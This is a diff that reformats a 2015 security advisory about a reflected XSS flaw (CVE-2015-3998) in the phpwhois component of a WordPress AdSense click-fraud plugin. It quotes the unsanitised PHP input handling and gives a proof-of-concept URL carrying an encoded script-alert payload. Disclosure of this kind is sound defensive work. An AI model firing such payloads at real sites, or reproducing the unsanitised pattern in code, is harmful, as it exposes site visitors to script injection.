@@ -1,29 +1,35 @@
-                                Advisory #: 119
-Title: Reflected XSS in Phpwhois component of adsense-click-fraud-monitoring
-wordpress plugin
-Author:Larry W. Cashdollar, @_larry0
-Date: 2015-05-11
-Download Site: https://wordpress.org/plugins/adsense-click-fraud-monitoring/
-Vendor:Dmitry Lukashin http://lukashin.ru/en/ Rene Hermenau https://
-profiles.wordpress.org/renehermi/
-Vendor Notified: 2015-05-12
-Vendor Contact: dmitry@lukashin.ru
-Description: Prevents to be banned and excluded from your AdSense account due
-to malicious or unintended third party clicks on advertisements on your
-website.
-Vulnerability:
-A component phpwhois 4.2.5 (http://phpwhois.pw https://github.com/phpWhois/
-phpWhois) packaged with this plugin contains a reflected XSS vulnerability due
-to not properly sanitizing user input before passing it to a html page: 36 if
-(isSet($_GET['query'])) 37 { 38 $query = $_GET['query']; 39 40 if (!empty($_GET
-['output'])) 41 $output = $_GET['output']; 42 else 43 $output = ''; . . 62 63
-$result = $whois->Lookup($query); 64 $resout = str_replace('{query}', $query,
-$resout); 65 $winfo = ''; 66
-CVE-2015-3998
-JSON:Export
-Exploit Code:
-   1. http://www.vapidlabs.internal/wp-content/plugins/adsense-click-fraud-
-      monitoring/phpwhois/
-      whois.php?query=%27%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&output=nice
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisory.php?v=119
+
+                               Advisory #: 119
+
+   Title: Reflected XSS in Phpwhois component of
+   adsense-click-fraud-monitoring wordpress plugin
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2015-05-11
+   Download Site:
+   https://wordpress.org/plugins/adsense-click-fraud-monitoring/
+   Vendor: Dmitry Lukashin http://lukashin.ru/en/ Rene Hermenau
+   https://profiles.wordpress.org/renehermi/
+   Vendor Notified: 2015-05-12
+   Vendor Contact: dmitry@lukashin.ru
+   Description: Prevents to be banned and excluded from your AdSense
+   account due to malicious or unintended third party clicks on
+   advertisements on your website.
+   Vulnerability:
+   A component phpwhois 4.2.5 (http://phpwhois.pw
+   https://github.com/phpWhois/phpWhois) packaged with this plugin
+   contains a reflected XSS vulnerability due to not properly sanitizing
+   user input before passing it to a html page: 36 if
+   (isSet($_GET['query'])) 37 { 38 $query = $_GET['query']; 39 40 if
+   (!empty($_GET['output'])) 41 $output = $_GET['output']; 42 else 43
+   $output = ''; . . 62 63 $result = $whois->Lookup($query); 64 $resout =
+   str_replace('{query}', $query, $resout); 65 $winfo = ''; 66
+   CVE-2015-3998
+   JSON: Export
+   Exploit Code:
+
+    1. http://www.vapidlabs.internal/wp-content/plugins/adsense-click-frau
+       d-monitoring/phpwhois/whois.php?query=%27%3Cscript%3Ealert%281%29%3
+       B%3C%2Fscript%3E&output=nice
+
+   Screen Shots:
+   Advisory: http://www.vapid.dhs.org/advisory.php?v=119
